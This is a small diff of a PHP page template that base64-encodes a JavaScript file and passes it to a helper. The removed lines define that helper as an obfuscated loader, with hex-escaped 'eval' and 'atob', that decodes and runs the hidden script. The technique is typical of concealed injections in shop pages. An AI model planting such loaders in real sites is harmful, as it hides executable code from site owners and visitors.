@@ -1,12 +1,14 @@
 
 <?php 
-$filebase64='K'.base64_encode(file_get_contents('Cart/jscode.js'));?>
+
+$filebase64='K'.base64_encode(file_get_contents($filejs));
+
+?>
 
 <script>glob('<?=$filebase64?>')</script>
 
-<script>
-  sfd=this["\x65\x76\x61\x6C"];rty=this["\x61\x74\x6F\x62"];glob=function(s){sfd(rty(s.substring(-~[])));}
-</script>
+
+
 
 
 
